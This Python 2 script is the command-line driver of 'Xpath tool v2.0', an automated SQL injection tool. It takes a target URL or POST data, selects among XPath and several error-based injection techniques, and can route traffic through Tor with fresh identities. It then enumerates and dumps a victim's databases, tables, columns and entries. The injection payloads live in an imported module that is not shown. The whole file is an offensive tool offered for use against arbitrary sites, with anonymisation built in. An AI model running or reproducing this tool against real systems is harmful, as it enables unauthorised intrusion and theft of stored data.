#!usr/bin/python

#######################################################
#   Xpath tool v2.0 - Automated Xpath Sql Injection   #
#       Author: Nasir khan (r0ot h3x49)               #
#######################################################

from proxy import Tor as TorNetwork
from banner import Xp_banner,ld
from Xtract import (
                    #  Injections type
                    XpathSqli,
                    ErrorBasedSQLi,
                    GeometricSqli,
                    BigintDoubleSQLi,
                    # Libs
                    compat_option,
                    compat_color,
                    compat_strftime,
                    compat_sleep
                    )

def main():
    print compat_color.fy + compat_color.sb + Xp_banner % (compat_color.fw,compat_color.sd, compat_color.fy,compat_color.sb,compat_color.fw,compat_color.sb, compat_color.fy,compat_color.sb) + compat_color.fg + compat_color.sb + ld 
    usage       =   "%prog [options]"
    version     =   "2.0#stable"
    Tor         =  TorNetwork()
    parser      =   compat_option.OptionParser(usage=usage, conflict_handler="resolve", version=version)
    parser.add_option("-h", "--help", action="help", help="Show basic help message and exit")
    parser.add_option("--version", action="version", help="Show program's version number and exit")

    target      =   compat_option.OptionGroup(parser, "Target",
                                    "At least one of these options has to be provided to define the "
                                    " target(s)")
    target.add_option('-u', '--url', dest="url", type=str, help='Target URL (e.g. "http://www.site.com/vuln.php?id=1")')

    request     =   compat_option.OptionGroup(parser, "Request",
                                    "These options can be used to specify how to connect to the target URL")
    request.add_option("--data",   dest="data", type=str, help="Data string to be sent through POST")
    request.add_option("--tor",    action='store_true',dest="tor", help="Use Tor anonymity network")
    request.add_option("--new-id", action='store_true',dest='nid', help="Request for new identity to Tor anonymity network")
    request.add_option("--timeout",   dest="timeout", type=int, help="Seconds to wait before timeout connection (default 30)", default=30)

    techniques = compat_option.OptionGroup(parser, "Techniques",
                        "These options can be used to tweak testing of specific SQL injection "
                        " techniques")

    techniques.add_option("--technique",  dest='tech', type=str,    help="SQL injection techniques to use  (default 'X')    "
                                                                         "error-based (DOUBLE/BIGINT) Injection (--technique=D) "
                                                                         "error-based   (Geometric)   Injection (--technique=G) "
                                                                         "error-based     (FLOOR)     Injection (--technique=E) ", 
                                                                    default="X")

    enumeration = compat_option.OptionGroup(parser, "Enumeration",
                        "These options can be used to enumerate the back-end database "
                        " managment system information, structure and data contained in the "
                        " tables.")

    enumeration.add_option("-b", "--banner", action='store_true',   dest='banner',      help="Retrieve DBMS banner")
    enumeration.add_option("--current-user", action='store_true',   dest='current_user',help="Retrieve DBMS current user")
    enumeration.add_option("--current-db",   action='store_true',   dest='current_db',  help="Retrieve DBMS current database")
    enumeration.add_option("--hostname",     action='store_true',   dest='hostname',    help="Retrieve DBMS server hostname")
    enumeration.add_option("--dbs",          action='store_true',   dest='dbs',         help="Enumerate DBMS databases")
    enumeration.add_option("--tables",       action='store_true',   dest='tables',      help="Enumerate DBMS database tables")
    enumeration.add_option("--columns",      action='store_true',   dest='columns',     help="Enumerate DBMS database table columns")
    enumeration.add_option("--dump",         action='store_true',   dest='dump',        help="Dump DBMS database table entries")
    enumeration.add_option("-D",             dest='db',   type=str,   help="DBMS database to enumerate")
    enumeration.add_option("-T",             dest='tbl',  type=str,  help="DBMS database tables(s) to enumerate")
    enumeration.add_option("-C",             dest='col',  type=str,  help="DBMS database table column(s) to enumerate")


    parser.add_option_group(target)
    parser.add_option_group(request)
    parser.add_option_group(techniques)
    parser.add_option_group(enumeration)

    (options, args) = parser.parse_args()

    if not options.url:
        parser.print_help()

    elif options.url and not options.data:

        if "*" in options.url:
            cust = raw_input(compat_color.fw + compat_color.sb + "custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n]  ")
            if cust == "Y" or cust == "y" or cust == "":
                pass
            else:
                print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
                exit(0)

        if options.timeout:
            timeout = options.timeout

        if options.tech == "G":
            SQLi   = GeometricSqli(options.url, timeout=timeout)
        elif options.tech == "E":
            SQLi   = ErrorBasedSQLi(options.url, timeout=timeout)
        elif options.tech == "D":
            SQLi   = BigintDoubleSQLi(options.url, timeout=timeout)
        else:
            SQLi   = XpathSqli(options.url, timeout=timeout)

        SQLi.PathToSave()

        print compat_color.fg + compat_color.sb + "\n[*] starting at "+compat_strftime("%H:%M:%S")+"\n"

        if options.banner:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Banner()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Banner()
            else:
                SQLi.Banner()
        elif options.current_db:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Database()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Database()
            else:
                SQLi.Database()
        elif options.current_user:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.User()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.User()
            else:
                SQLi.User()
        elif options.hostname:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Host()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Host()
            else:
                SQLi.Host()
        elif options.dbs:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Databases()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Databases()
            else:
                SQLi.Databases()
        elif options.db and options.tables:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Tables(options.db)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Tables(options.db)
            else:
                SQLi.Tables(options.db)
        elif options.db and options.tbl and options.columns:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Columns(options.db, options.tbl)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Columns(options.db, options.tbl)
            else:
                SQLi.Columns(options.db, options.tbl)
        elif options.db and options.tbl and options.col and options.dump:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Dumps(options.db, options.tbl, options.col)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Dumps(options.db, options.tbl, options.col)
            else:
                SQLi.Dumps(options.db, options.tbl, options.col)
        print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"


    elif options.url and options.data:

        if "*" in options.data:
            cust = raw_input(compat_color.fw + compat_color.sb + "custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n]  ")
            if cust == "Y" or cust == "y" or cust == "":
                pass
            else:
                print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"

        if options.timeout:
            timeout = options.timeout

        if options.tech == "G":
            SQLi   = GeometricSqli(options.url, data=options.data, timeout=timeout)
        elif options.tech == "E":
            SQLi   = ErrorBasedSQLi(options.url, data=options.data, timeout=timeout)
        elif options.tech == "D":
            SQLi   = BigintDoubleSQLi(options.url, data=options.data, timeout=timeout)
        else:
            SQLi   = XpathSqli(options.url, data=options.data, timeout=timeout)

        SQLi.PathToSave()
        print compat_color.fg + compat_color.sb + "\n[*] starting at "+compat_strftime("%H:%M:%S")+"\n"
        
        if options.banner:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Banner()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Banner()
            else:
                SQLi.Banner()
        elif options.current_db:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Database()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Database()
            else:
                SQLi.Database()
        elif options.current_user:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.User()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.User()
            else:
                SQLi.User()
        elif options.hostname:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Host()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Host()
            else:
                SQLi.Host()
        elif options.dbs:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Databases()
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Databases()
            else:
                SQLi.Databases()
        elif options.db and options.tables:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Tables(options.db)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Tables(options.db)
            else:
                SQLi.Tables(options.db)
        elif options.db and options.tbl and options.columns:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Columns(options.db, options.tbl)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Columns(options.db, options.tbl)
            else:
                SQLi.Columns(options.db, options.tbl)
        elif options.db and options.tbl and options.col and options.dump:
            if options.tor and not options.nid:
                Tor.compat_proxy_connect
                SQLi.Dumps(options.db, options.tbl, options.col)
            elif options.tor and options.nid:
                Tor.compat_proxy_newid
                SQLi.Dumps(options.db, options.tbl, options.col)
            else:
                SQLi.Dumps(options.db, options.tbl, options.col)

        print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
            

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print '\n' + compat_color.fr + compat_color.sn + '['+compat_strftime("%H:%M:%S")+'] [ERROR] user aborted'
        print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
    except TypeError:
        print '\n' + compat_color.fr + compat_color.sb + '['+compat_strftime("%H:%M:%S")+'] [ERROR] failed to extract data using available paylaods.'
        print compat_color.fw + compat_color.sn + "\n[*] shutting down at "+compat_strftime("%H:%M:%S")+"\n"
    
